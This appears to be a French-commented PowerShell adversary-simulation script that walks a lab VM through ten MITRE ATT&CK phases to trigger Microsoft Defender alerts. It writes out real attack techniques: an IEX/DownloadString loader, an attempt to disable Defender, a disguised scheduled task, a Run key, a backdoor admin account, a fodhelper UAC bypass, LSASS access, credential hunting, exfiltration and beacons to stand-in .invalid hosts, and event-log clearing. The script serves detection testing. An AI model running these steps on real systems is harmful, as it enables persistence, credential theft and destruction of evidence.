# ==============================================================================
#  SIMLAB - Operation Midnight Analyst
#  Script de simulation d'attaque APT pour Microsoft Defender for Endpoint
#  USAGE : Lancer en tant qu'Administrateur dans PowerShell
#  AVERTISSEMENT : A utiliser UNIQUEMENT sur votre VM de lab isolée
# ==============================================================================

#Requires -Version 5.1

# ── Couleurs & helpers ──────────────────────────────────────────────────────

function Write-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "  ║        SIMLAB — Operation Midnight Analyst               ║" -ForegroundColor Cyan
    Write-Host "  ║        Simulation APT · Microsoft Defender Lab           ║" -ForegroundColor Cyan
    Write-Host "  ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

function Write-PhaseHeader {
    param([int]$Phase, [int]$Total, [string]$Title, [string]$Mitre)
    Write-Host ""
    Write-Host "  ┌─────────────────────────────────────────────────────────┐" -ForegroundColor Yellow
    Write-Host ("  │  PHASE {0}/{1} — {2,-47}│" -f $Phase, $Total, $Title) -ForegroundColor Yellow
    Write-Host ("  │  MITRE: {0,-50}│" -f $Mitre) -ForegroundColor DarkYellow
    Write-Host "  └─────────────────────────────────────────────────────────┘" -ForegroundColor Yellow
}

function Write-Ok    { param([string]$msg) Write-Host "  [+] $msg" -ForegroundColor Green }
function Write-Info  { param([string]$msg) Write-Host "  [*] $msg" -ForegroundColor Cyan }
function Write-Warn  { param([string]$msg) Write-Host "  [!] $msg" -ForegroundColor Red }
function Write-Block { param([string]$msg) Write-Host "  [BLOCKED] $msg" -ForegroundColor Magenta }

# Pause calibrée pour laisser Defender ingérer les événements
function Wait-ForDefender {
    param([int]$Seconds = 8, [string]$Reason = "Defender telemetry ingestion")
    Write-Host ""
    Write-Host "  ⏳ Pause $Seconds s — $Reason" -ForegroundColor DarkGray
    for ($i = $Seconds; $i -gt 0; $i--) {
        Write-Host -NoNewline "`r  ⏳ Reprise dans $i s...   "
        Start-Sleep -Seconds 1
    }
    Write-Host "`r  ✅ Reprise.                              "
}

# ── Vérification pré-simulation ─────────────────────────────────────────────

function Test-Prerequisites {
    Write-Info "Vérification des prérequis..."

    # MDE onboarding
    $onboardState = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection" `
        -Name "OnboardingState" -ErrorAction SilentlyContinue).OnboardingState

    if ($onboardState -ne 1) {
        Write-Warn "ATTENTION : La VM ne semble pas onboardée sur MDE (OnboardingState = $onboardState)"
        Write-Warn "Les alertes Defender pourraient ne pas apparaître dans le portail."
        $confirm = Read-Host "  Continuer quand même ? (o/N)"
        if ($confirm -ne 'o') { exit 1 }
    } else {
        Write-Ok "VM onboardée sur Microsoft Defender for Endpoint (OnboardingState = 1)"
    }

    # Service Sense
    $sense = Get-Service -Name "Sense" -ErrorAction SilentlyContinue
    if ($sense -and $sense.Status -eq "Running") {
        Write-Ok "Service Sense (MDE Agent) : Running"
    } else {
        Write-Warn "Service Sense non actif — vérifier l'onboarding"
    }

    # Droits admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Ok "Exécution en tant qu'Administrateur : OK"
    } else {
        Write-Warn "Script non lancé en admin — certaines phases échoueront (résultat voulu)"
    }
}

# ── Workspace ────────────────────────────────────────────────────────────────

$SimRoot   = "C:\SimLab"
$SimStart  = Get-Date
$LogFile   = "$SimRoot\simlab_run.log"

function Initialize-Workspace {
    Write-Info "Création du workspace de simulation..."
    @("$SimRoot", "$SimRoot\stage1", "$SimRoot\stage2", "$SimRoot\exfil", "$SimRoot\loot") | ForEach-Object {
        New-Item -ItemType Directory -Path $_ -Force | Out-Null
    }

    # Initialiser le log
    "=== SIMLAB Run Log — $SimStart ===" | Out-File $LogFile
    Write-Ok "Workspace initialisé : $SimRoot"
}

function Write-Log {
    param([string]$Phase, [string]$Action, [string]$Result)
    "[$((Get-Date).ToString('HH:mm:ss'))] [$Phase] $Action → $Result" | Add-Content $LogFile
}

# ==============================================================================
#  PHASES
# ==============================================================================

# ─── PHASE 1 : Reconnaissance ────────────────────────────────────────────────
function Invoke-Phase1 {
    Write-PhaseHeader 1 10 "Reconnaissance" "T1082 T1016 T1033 T1057 T1518"

    # T1082 — System Info
    Write-Info "T1082 · System Information Discovery"
    @{
        Hostname     = $env:COMPUTERNAME
        OS           = (Get-WmiObject Win32_OperatingSystem).Caption
        OSBuild      = (Get-WmiObject Win32_OperatingSystem).BuildNumber
        Architecture = $env:PROCESSOR_ARCHITECTURE
        Domain       = (Get-WmiObject Win32_ComputerSystem).Domain
        Uptime       = ((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime).ToString()
    } | Out-File "$SimRoot\stage1\sys_recon.txt"
    Write-Ok "sys_recon.txt créé"
    Write-Log "Phase1" "T1082 SystemInfo" "OK"

    # T1016 — Network
    Write-Info "T1016 · Network Configuration Discovery"
    ipconfig /all | Out-File "$SimRoot\stage1\network_info.txt"
    Get-NetAdapter | Select-Object Name, Status, MacAddress | Out-File "$SimRoot\stage1\adapters.txt"
    Get-DnsClientCache | Select-Object Entry, RecordName, Data | Out-File "$SimRoot\stage1\dns_cache.txt"
    Write-Ok "Infos réseau collectées"
    Write-Log "Phase1" "T1016 NetworkConfig" "OK"

    # T1033 — User Discovery
    Write-Info "T1033 · User & Admin Discovery"
    whoami /all | Out-File "$SimRoot\stage1\whoami_all.txt"
    net user | Out-File "$SimRoot\stage1\users.txt"
    net localgroup administrators | Out-File "$SimRoot\stage1\local_admins.txt"
    Write-Ok "whoami /all exécuté — alerte SuspiciousDiscovery attendue"
    Write-Log "Phase1" "T1033 UserDiscovery" "Alert expected"

    # T1057 — Process Discovery
    Write-Info "T1057 · Process Discovery"
    Get-Process | Select-Object Name, Id, CPU, WorkingSet | Sort-Object CPU -Descending |
        Out-File "$SimRoot\stage1\processes.txt"
    Write-Ok "Liste des processus collectée"

    # T1518 — Security Software Discovery
    Write-Info "T1518 · Security Software Discovery (AV via WMI)"
    Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct -ErrorAction SilentlyContinue |
        Select-Object displayName, productState | Out-File "$SimRoot\stage1\av_products.txt"
    Write-Ok "Énumération AV via WMI — alerte SecurityToolDiscovery attendue"
    Write-Log "Phase1" "T1518 AVDiscovery" "Alert expected"

    Write-Ok "PHASE 1 TERMINÉE"
    Wait-ForDefender -Seconds 10 -Reason "Corrélation des événements de reconnaissance"
}

# ─── PHASE 2 : Initial Access ────────────────────────────────────────────────
function Invoke-Phase2 {
    Write-PhaseHeader 2 10 "Initial Access (Phishing Sim)" "T1566.001 T1059.001 T1204.002"

    # Simule un document malveillant déposé
    Write-Info "T1566.001 · Simulation dépôt de document phishing"
    $macroSim = @'
# SIMULATION: Représente le comportement d'une macro VBA malveillante
$dropper = [System.Text.Encoding]::Unicode.GetString(
    [System.Convert]::FromBase64String(
        [System.Convert]::ToBase64String(
            [System.Text.Encoding]::Unicode.GetBytes("Write-Host 'Payload SimLab executed'")
        )
    )
)
'@
    $macroSim | Out-File "$SimRoot\stage1\Invoice_Q4_2024.docm"
    Write-Ok "Faux document phishing créé : Invoice_Q4_2024.docm"

    # T1059.001 — EncodedCommand (déclencheur fiable n°1 de Defender)
    Write-Info "T1059.001 · PowerShell -EncodedCommand (alerte haute confiance)"
    $encodedCmd = [Convert]::ToBase64String(
        [Text.Encoding]::Unicode.GetBytes(
            'Write-Host "SimLab: Stage 1 execution - Invoice processing initiated"'
        )
    )
    powershell.exe -EncodedCommand $encodedCmd
    Write-Ok "EncodedCommand exécuté — alerte SuspiciousEncodedCommandLine attendue"
    Write-Log "Phase2" "T1059.001 EncodedCommand" "Alert MEDIUM expected"

    Write-Ok "PHASE 2 TERMINÉE"
    Wait-ForDefender -Seconds 12 -Reason "Incident clustering initial access + execution"
}

# ─── PHASE 3 : Execution & Defense Evasion ───────────────────────────────────
function Invoke-Phase3 {
    Write-PhaseHeader 3 10 "Execution & Defense Evasion" "T1059.001 T1027 T1562.001 T1112"

    # T1059.001 — Pattern IEX/DownloadString (écrit sur disque, détecté par scan)
    Write-Info "T1059.001 · Pattern IEX + DownloadString écrit sur disque"
    'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://[SIMULATED-C2]")' |
        Out-File "$SimRoot\stage2\stage2_loader.ps1"
    Write-Ok "Loader script créé — pattern IEX détecté par scan Defender"
    Write-Log "Phase3" "T1059.001 IEX pattern on disk" "Alert expected"

    # T1027 — Obfuscated/encoded content
    Write-Info "T1027 · Simulation contenu obfusqué (base64)"
    $obfSim = @"
# SIMLAB T1027: Obfuscated payload simulation
`$bytes = [System.Convert]::FromBase64String('U2ltTGFiIFBheWxvYWQ=')
`$decoded = [System.Text.Encoding]::UTF8.GetString(`$bytes)
Write-Host `$decoded
"@
    $obfSim | Out-File "$SimRoot\stage2\obfuscated_sim.ps1"
    & "$SimRoot\stage2\obfuscated_sim.ps1"
    Write-Ok "Script obfusqué exécuté"
    Write-Log "Phase3" "T1027 Obfuscated exec" "OK"

    # T1112 — Registry modification (staging attaquant)
    Write-Info "T1112 · Modification du registre (config attaquant)"
    $regPath = "HKCU:\Software\SimLab\AttackSim"
    New-Item -Path $regPath -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "Stage"  -Value "2"          -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "Config" -Value "dGVzdA=="   -PropertyType String -Force | Out-Null
    Write-Ok "Clé registre SimLab créée — RegistryModification dans timeline"
    Write-Log "Phase3" "T1112 Registry staging" "Alert expected"

    # T1562.001 — Tentative désactivation Defender (sera bloquée — c'est voulu)
    Write-Info "T1562.001 · Tentative de désactivation Defender (sera bloquée)"
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        Write-Warn "DisableRealtime a réussi — inattendu sur une VM MDE managée"
    } catch {
        Write-Block "Tentative de désactivation bloquée — alerte TamperingAttempt HIGH attendue"
        Write-Log "Phase3" "T1562.001 DisableDefender BLOCKED" "Alert HIGH expected"
    }

    Write-Ok "PHASE 3 TERMINÉE"
    Wait-ForDefender -Seconds 15 -Reason "Corrélation evasion + tampering"
}

# ─── PHASE 4 : Persistence ───────────────────────────────────────────────────
function Invoke-Phase4 {
    Write-PhaseHeader 4 10 "Persistence" "T1053.005 T1547.001 T1136.001"

    # T1053.005 — Scheduled Task
    Write-Info "T1053.005 · Création tâche planifiée masquée (nom imitant Edge)"
    $taskAction = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -Command 'Write-EventLog -LogName Application -Source SimLab -EventId 9999 -Message SimLabPersistence -ErrorAction SilentlyContinue'"
    $taskTrigger  = New-ScheduledTaskTrigger -AtLogOn
    $taskSettings = New-ScheduledTaskSettingsSet -Hidden

    Register-ScheduledTask `
        -TaskName "MicrosoftEdgeUpdateTaskMachineCore_SimLab" `
        -Action $taskAction `
        -Trigger $taskTrigger `
        -Settings $taskSettings `
        -RunLevel Highest `
        -Force | Out-Null
    Write-Ok "Tâche planifiée créée : MicrosoftEdgeUpdateTaskMachineCore_SimLab"
    Write-Log "Phase4" "T1053.005 ScheduledTask" "Alert MEDIUM expected"

    # T1547.001 — Registry Run Key
    Write-Info "T1547.001 · Clé Run registre (persistence au démarrage)"
    Set-ItemProperty `
        -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "MicrosoftSyncHelper" `
        -Value "powershell.exe -WindowStyle Hidden -File $SimRoot\stage2\obfuscated_sim.ps1"
    Write-Ok "Run key créée : MicrosoftSyncHelper"
    Write-Log "Phase4" "T1547.001 RunKey" "Alert MEDIUM expected"

    # T1136.001 — Création compte backdoor local
    Write-Info "T1136.001 · Création compte administrateur backdoor"
    try {
        $secPass = ConvertTo-SecureString "SimLab@2024!" -AsPlainText -Force
        New-LocalUser `
            -Name "svc_backup_sim" `
            -Password $secPass `
            -Description "Backup Service Account" `
            -PasswordNeverExpires `
            -ErrorAction Stop | Out-Null
        Add-LocalGroupMember -Group "Administrators" -Member "svc_backup_sim" -ErrorAction SilentlyContinue
        Write-Ok "Compte backdoor créé : svc_backup_sim (Administrateur)"
        Write-Log "Phase4" "T1136.001 BackdoorAccount" "Alert HIGH expected"
    } catch {
        Write-Info "Tentative via net user (fallback)"
        net user svc_backup_sim "SimLab@2024!" /add /comment:"Backup Service Account" 2>$null
        net localgroup administrators svc_backup_sim /add 2>$null
        Write-Ok "Compte svc_backup_sim créé via net user"
        Write-Log "Phase4" "T1136.001 BackdoorAccount net user" "Alert HIGH expected"
    }

    Write-Ok "PHASE 4 TERMINÉE — 3 mécanismes de persistence plantés"
    Wait-ForDefender -Seconds 15 -Reason "Corrélation des 3 alertes de persistence en un incident"
}

# ─── PHASE 5 : Privilege Escalation ─────────────────────────────────────────
function Invoke-Phase5 {
    Write-PhaseHeader 5 10 "Privilege Escalation" "T1548.002 T1134 T1078"

    # Énumération des privilèges actuels
    Write-Info "T1134 · Énumération des privilèges"
    whoami /priv | Out-File "$SimRoot\stage2\current_privs.txt"
    Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue |
        Out-File "$SimRoot\stage2\admin_members.txt"
    Write-Ok "Privilèges actuels collectés"

    # T1548.002 — UAC Bypass fodhelper
    Write-Info "T1548.002 · Simulation bypass UAC via fodhelper (registre)"
    $uacKey = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    try {
        New-Item -Path $uacKey -Force | Out-Null
        New-ItemProperty -Path $uacKey -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty -Path $uacKey -Name "(Default)" -Value "cmd.exe /c echo SimLab-UAC-Bypass-Sim" -Force
        Write-Ok "Clé registre bypass UAC écrite — alerte UACBypassAttempt HIGH attendue"
        Write-Log "Phase5" "T1548.002 UAC Bypass fodhelper" "Alert HIGH expected"

        Start-Sleep -Seconds 5  # Laisser Defender scanner la clé

        # Nettoyage immédiat (on veut juste le telemetry, pas la persistence)
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Ok "Clé UAC bypass nettoyée (telemetry générée)"
    } catch {
        Write-Warn "Erreur simulation UAC bypass : $_"
    }

    # T1003.001 — Accès LSASS (sera bloqué — génère alerte CRITICAL)
    Write-Info "T1003.001 · Tentative d'accès à LSASS (credential dumping)"
    try {
        $lsass  = Get-Process lsass -ErrorAction Stop
        $handle = [System.Diagnostics.Process]::GetProcessById($lsass.Id)
        Write-Ok "Handle LSASS obtenu — alerte CredentialDumpingAttempt CRITICAL attendue"
        Write-Log "Phase5" "T1003.001 LSASS access" "Alert CRITICAL expected"
    } catch {
        Write-Block "Accès LSASS bloqué par Defender — alerte CRITICAL générée comme prévu"
        Write-Log "Phase5" "T1003.001 LSASS BLOCKED" "Alert CRITICAL expected"
    }

    Write-Ok "PHASE 5 TERMINÉE"
    Wait-ForDefender -Seconds 20 -Reason "LSASS alert est CRITICAL — laisser Defender corréler"
}

# ─── PHASE 6 : Credential Access ─────────────────────────────────────────────
function Invoke-Phase6 {
    Write-PhaseHeader 6 10 "Credential Access" "T1552.001 T1555 T1003.001"

    # T1552.001 — Recherche de credentials dans les fichiers
    Write-Info "T1552.001 · Recherche de credentials dans les fichiers"
    $credHunt = @"
`$searchPaths = @("C:\Users\$env:USERNAME\Documents", "C:\SimLab", "C:\Users\$env:USERNAME\Desktop")
`$patterns = @('password', 'passwd', 'secret', 'token', 'apikey', 'connectionstring')
foreach (`$path in `$searchPaths) {
    if (Test-Path `$path) {
        Get-ChildItem -Path `$path -Recurse -Include *.txt,*.xml,*.config,*.json,*.ps1 -ErrorAction SilentlyContinue |
        Select-String -Pattern (`$patterns -join '|') -ErrorAction SilentlyContinue |
        Select-Object -First 20
    }
}
"@
    $credHunt | Out-File "$SimRoot\stage2\cred_hunt.ps1"
    & "$SimRoot\stage2\cred_hunt.ps1" | Out-File "$SimRoot\loot\found_creds.txt" -ErrorAction SilentlyContinue
    Write-Ok "Script de recherche credentials exécuté — SensitiveFileAccess attendue"
    Write-Log "Phase6" "T1552.001 CredHunt" "Alert expected"

    # Créer un faux fichier de credentials trouvé
    @"
[SIMULATION DATA — PAS DE VRAIES CREDENTIALS]
<connectionString>Server=db01;Database=HR;User=sa;Password=SimPassword123!</connectionString>
"@ | Out-File "$SimRoot\loot\harvested_config.txt"
    Write-Ok "Faux fichier config avec credentials créé"

    # T1555 — Windows Credential Manager
    Write-Info "T1555 · Énumération Windows Credential Manager"
    cmdkey /list | Out-File "$SimRoot\loot\stored_creds_list.txt" -ErrorAction SilentlyContinue
    vaultcmd /listcreds:"Web Credentials" /all 2>$null |
        Out-File "$SimRoot\loot\vault_creds.txt" -ErrorAction SilentlyContinue
    Write-Ok "cmdkey + vaultcmd exécutés — WindowsCredentialManagerAccess attendue"
    Write-Log "Phase6" "T1555 CredManager" "Alert expected"

    Write-Ok "PHASE 6 TERMINÉE"
    Wait-ForDefender -Seconds 12 -Reason "Agrégation de l'attack story credential access"
}

# ─── PHASE 7 : Lateral Movement ──────────────────────────────────────────────
function Invoke-Phase7 {
    Write-PhaseHeader 7 10 "Lateral Movement Simulation" "T1021.001 T1021.002 T1570"

    # T1021.002 — Admin Shares Enumeration
    Write-Info "T1021.002 · Énumération des partages admin réseau"
    net share | Out-File "$SimRoot\stage2\shares_found.txt"

    $localIP = (Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } |
        Select-Object -First 1).IPAddress

    foreach ($share in @("C$", "ADMIN$", "IPC$")) {
        $p = "\\$localIP\$share"
        Write-Info "Test du partage : $p"
        Test-Path $p -ErrorAction SilentlyContinue | Out-Null
    }
    Write-Ok "Admin shares testés"
    Write-Log "Phase7" "T1021.002 AdminShares" "Timeline event expected"

    # T1570 — Lateral Tool Transfer (simulation)
    Write-Info "T1570 · Simulation transfert d'outil vers cible"
    $toolSim = "$SimRoot\stage2\psexec_sim.exe"
    [System.IO.File]::WriteAllText($toolSim, "SIMLAB_PLACEHOLDER_NOT_EXECUTABLE")
    Copy-Item $toolSim "$SimRoot\loot\transferred_tool.exe"
    Write-Ok "Transfert d'outil simulé"
    Write-Log "Phase7" "T1570 ToolTransfer" "OK"

    # T1021.001 — RDP Discovery
    Write-Info "T1021.001 · Vérification statut RDP"
    $rdpStatus = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" `
        -Name "fDenyTSConnections").fDenyTSConnections
    $rdpEnabled = if ($rdpStatus -eq 0) { "Enabled" } else { "Disabled" }
    "RDP Status: $rdpEnabled" | Out-File "$SimRoot\stage2\rdp_status.txt"
    query session 2>$null | Out-File "$SimRoot\stage2\active_sessions.txt"
    quser 2>$null | Out-File "$SimRoot\stage2\logged_users.txt" -ErrorAction SilentlyContinue
    Write-Ok "RDP recon + sessions actives collectés"
    Write-Log "Phase7" "T1021.001 RDP Discovery" "OK"

    Write-Ok "PHASE 7 TERMINÉE"
    Wait-ForDefender -Seconds 10 -Reason "Corrélation lateral movement"
}

# ─── PHASE 8 : Collection & Exfiltration ─────────────────────────────────────
function Invoke-Phase8 {
    Write-PhaseHeader 8 10 "Data Collection & Exfiltration Sim" "T1005 T1560.001 T1048 T1041"

    # T1005 — Data Collection
    Write-Info "T1005 · Collecte de fichiers sensibles"
    $collectionLog = @()
    foreach ($ext in @("*.docx","*.xlsx","*.pdf","*.pst","*.kdbx","*.pfx")) {
        Get-ChildItem -Path "C:\Users\$env:USERNAME" -Filter $ext -Recurse -ErrorAction SilentlyContinue |
            Select-Object -First 5 | ForEach-Object {
                $collectionLog += [PSCustomObject]@{
                    Extension = $ext; FullPath = $_.FullName
                    Size = $_.Length; Modified = $_.LastWriteTime
                }
            }
    }
    $collectionLog | Export-Csv "$SimRoot\loot\collected_files.csv" -NoTypeInformation
    Write-Ok "$($collectionLog.Count) fichiers sensibles collectés"

    # T1560.001 — Archive des données
    Write-Info "T1560.001 · Compression des données pour exfiltration"

    # Créer le document DLP-trigger AVANT de compresser
    @"
CONFIDENTIEL — USAGE INTERNE UNIQUEMENT

Registre employés (DONNÉES DE SIMULATION — PAS RÉELLES) :
John Doe - 123-45-6789
Jane Smith - 987-65-4321

Numéros de carte (SIMULATION) :
4532-0151-1283-0366
5425-2334-3010-9903

Azure Connection String (SIMULATION) :
DefaultEndpointsProtocol=https;AccountName=simstorageaccount;AccountKey=SimLabKey==;EndpointSuffix=core.windows.net
"@ | Out-File "$SimRoot\exfil\CONFIDENTIAL_HR_Report.txt"
    Write-Ok "Document DLP-trigger créé (SSN + CC + connection string)"

    try {
        Compress-Archive -Path "$SimRoot\loot\*" `
            -DestinationPath "$SimRoot\exfil\data_package.zip" -Force
        $size = (Get-Item "$SimRoot\exfil\data_package.zip").Length
        Write-Ok "Archive créée : data_package.zip ($size bytes)"
        Write-Log "Phase8" "T1560.001 Archive" "Alert MEDIUM expected"
    } catch {
        Write-Warn "Erreur archive : $_"
    }

    # T1048 — DNS Exfiltration simulation
    Write-Info "T1048 · Simulation exfiltration DNS (requête vers domaine invalide)"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("SimLab-ExfilTest-Package1"))
    $encoded = $encoded -replace '[^a-zA-Z0-9]', ''
    try {
        Resolve-DnsName "$encoded.exfil-sim.invalid" -ErrorAction SilentlyContinue | Out-Null
    } catch { }
    Write-Ok "Requête DNS d'exfiltration envoyée — telemetry réseau générée"
    Write-Log "Phase8" "T1048 DNS Exfil" "Network telemetry expected"

    # T1041 — HTTPS Exfiltration simulation
    Write-Info "T1041 · Simulation exfiltration HTTPS (endpoint inexistant)"
    try {
        Invoke-WebRequest -Uri "https://exfil-endpoint-simlab.invalid/upload" `
            -Method POST -Body "SimLab_Package" -TimeoutSec 3 -ErrorAction SilentlyContinue | Out-Null
    } catch { }
    Write-Ok "Tentative upload HTTPS générée (échec prévu) — telemetry réseau créée"
    Write-Log "Phase8" "T1041 HTTPS Exfil" "Network telemetry expected"

    Write-Ok "PHASE 8 TERMINÉE"
    Wait-ForDefender -Seconds 15 -Reason "Corrélation archive + exfiltration réseau"
}

# ─── PHASE 9 : C2 Beaconing ──────────────────────────────────────────────────
function Invoke-Phase9 {
    Write-PhaseHeader 9 10 "C2 Beacon Simulation" "T1071.001 T1095 T1132"

    Write-Info "T1071.001 · Simulation beaconing C2 périodique (3 cycles × 15s)"
    $c2Log = @()

    for ($i = 1; $i -le 3; $i++) {
        $beaconTime = Get-Date
        $beaconId   = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("beacon_$i"))

        try {
            Invoke-WebRequest -Uri "https://c2-simlab-beacon.invalid/check-in?id=$beaconId" `
                -TimeoutSec 2 -ErrorAction SilentlyContinue | Out-Null
        } catch { }

        $c2Log += [PSCustomObject]@{
            BeaconNumber = $i
            Timestamp    = $beaconTime
            SimEndpoint  = "https://c2-simlab-beacon.invalid"
            BeaconId     = $beaconId
        }

        Write-Ok "Beacon $i/$3 envoyé à $($beaconTime.ToString('HH:mm:ss'))"
        Write-Log "Phase9" "T1071.001 C2 Beacon $i" "Network telemetry expected"

        if ($i -lt 3) {
            Write-Host "  ⏳ Intervalle beacon (15s pour simuler périodicité)..." -ForegroundColor DarkGray
            Start-Sleep -Seconds 15
        }
    }

    $c2Log | Export-Csv "$SimRoot\stage2\c2_beacon_log.csv" -NoTypeInformation
    Write-Ok "3 cycles de beaconing complétés — pattern périodique dans telemetry réseau"
    Wait-ForDefender -Seconds 10 -Reason "Analyse du pattern de beaconing C2"
}

# ─── PHASE 10 : Anti-Forensics & Cleanup ─────────────────────────────────────
function Invoke-Phase10 {
    Write-PhaseHeader 10 10 "Anti-Forensics / Cleanup" "T1070.001 T1070.004 T1112"

    # T1070.001 — Event Log Clearing (sera bloqué — alerte CRITICAL)
    Write-Info "T1070.001 · Tentative d'effacement des journaux d'événements"
    try {
        wevtutil cl System 2>$null
        Write-Warn "Journal System effacé (inattendu en environnement MDE)"
    } catch {
        Write-Block "Effacement des logs bloqué — alerte EventLogCleared HIGH attendue"
    }
    Write-Log "Phase10" "T1070.001 EventLogClear" "Alert HIGH expected"

    # PowerShell history clearing
    Write-Info "Suppression de l'historique PowerShell"
    try {
        $histPath = (Get-PSReadLineOption).HistorySavePath
        if (Test-Path $histPath) {
            Clear-Content $histPath
            Write-Ok "Historique PowerShell effacé"
        }
    } catch { }

    # T1070.004 — File Deletion (stage1)
    Write-Info "T1070.004 · Suppression des artefacts stage1"
    Remove-Item "$SimRoot\stage1\*" -Force -ErrorAction SilentlyContinue
    Write-Ok "Artefacts stage1 supprimés — File deletion dans timeline"
    Write-Log "Phase10" "T1070.004 FileDeletion" "Timeline event expected"

    # T1112 — Suppression des clés registre (cleanup simulation)
    Write-Info "T1112 · Nettoyage des artefacts registre"
    Unregister-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineCore_SimLab" `
        -Confirm:$false -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "MicrosoftSyncHelper" -ErrorAction SilentlyContinue
    Remove-Item -Path "HKCU:\Software\SimLab" -Recurse -Force -ErrorAction SilentlyContinue
    net user svc_backup_sim /delete 2>$null
    Write-Ok "Persistence nettoyée (telemetry toujours dans Defender)"
    Write-Log "Phase10" "T1112 Registry cleanup" "OK"

    Write-Ok "PHASE 10 TERMINÉE"
    Wait-ForDefender -Seconds 20 -Reason "Dernière corrélation — anti-forensics complète l'incident"
}

# ==============================================================================
#  RAPPORT FINAL
# ==============================================================================

function Write-FinalReport {
    $SimEnd      = Get-Date
    $Duration    = ($SimEnd - $SimStart).ToString("mm\:ss")

    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║            SIMULATION TERMINÉE AVEC SUCCÈS              ║" -ForegroundColor Green
    Write-Host "  ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Durée totale    : $Duration" -ForegroundColor White
    Write-Host "  Démarrage       : $($SimStart.ToString('HH:mm:ss'))" -ForegroundColor White
    Write-Host "  Fin             : $($SimEnd.ToString('HH:mm:ss'))" -ForegroundColor White
    Write-Host "  Log de run      : $LogFile" -ForegroundColor White
    Write-Host ""
    Write-Host "  ── Prochaines étapes dans Defender Portal ──────────────" -ForegroundColor Cyan
    Write-Host "  1. security.microsoft.com → Incidents & Alerts → Incidents" -ForegroundColor White
    Write-Host "  2. Chercher l'incident 'Multi-stage attack' (severity HIGH/CRITICAL)" -ForegroundColor White
    Write-Host "  3. Device Timeline → filtrer depuis $($SimStart.ToString('HH:mm'))" -ForegroundColor White
    Write-Host "  4. Advanced Hunting → utiliser les requêtes KQL du guide" -ForegroundColor White
    Write-Host ""
    Write-Host "  ── Alertes attendues (résumé) ──────────────────────────" -ForegroundColor Cyan
    Write-Host "  [LOW/MED]  SuspiciousDiscoveryActivity         (Phase 1)" -ForegroundColor White
    Write-Host "  [MEDIUM]   SuspiciousEncodedCommandLine        (Phase 2)" -ForegroundColor White
    Write-Host "  [HIGH]     TamperingAttempt                    (Phase 3)" -ForegroundColor White
    Write-Host "  [MEDIUM]   PersistenceThroughScheduledTask     (Phase 4)" -ForegroundColor White
    Write-Host "  [HIGH]     NewLocalAdminAccount                (Phase 4)" -ForegroundColor White
    Write-Host "  [HIGH]     UACBypassAttempt                    (Phase 5)" -ForegroundColor White
    Write-Host "  [CRITICAL] CredentialDumpingAttempt (LSASS)    (Phase 5)" -ForegroundColor Red
    Write-Host "  [MEDIUM]   CredentialAccessFromPasswordStore   (Phase 6)" -ForegroundColor White
    Write-Host "  [MEDIUM]   SuspiciousArchiveAndExfil           (Phase 8)" -ForegroundColor White
    Write-Host "  [HIGH]     EventLogCleared / AntiForensics     (Phase 10)" -ForegroundColor White
    Write-Host ""
    Write-Host "  Note: Defender peut mettre jusqu'à 5-15 min pour grouper" -ForegroundColor DarkGray
    Write-Host "  tous les événements en incidents corrélés." -ForegroundColor DarkGray
    Write-Host ""

    # Écrire le rapport dans le log
    "`n=== SIMULATION COMPLETE ===" | Add-Content $LogFile
    "Start: $SimStart | End: $SimEnd | Duration: $Duration" | Add-Content $LogFile
    "Portail Defender: security.microsoft.com" | Add-Content $LogFile
}

# ==============================================================================
#  POINT D'ENTRÉE — ORCHESTRATION DES PHASES
# ==============================================================================

Write-Banner
Test-Prerequisites
Initialize-Workspace

Write-Host ""
Write-Host "  La simulation va démarrer dans 5 secondes..." -ForegroundColor Yellow
Write-Host "  (Ctrl+C pour annuler)" -ForegroundColor DarkGray
Start-Sleep -Seconds 5

# ── Exécution séquentielle ──
Invoke-Phase1
Invoke-Phase2
Invoke-Phase3
Invoke-Phase4
Invoke-Phase5
Invoke-Phase6
Invoke-Phase7
Invoke-Phase8
Invoke-Phase9
Invoke-Phase10

Write-FinalReport
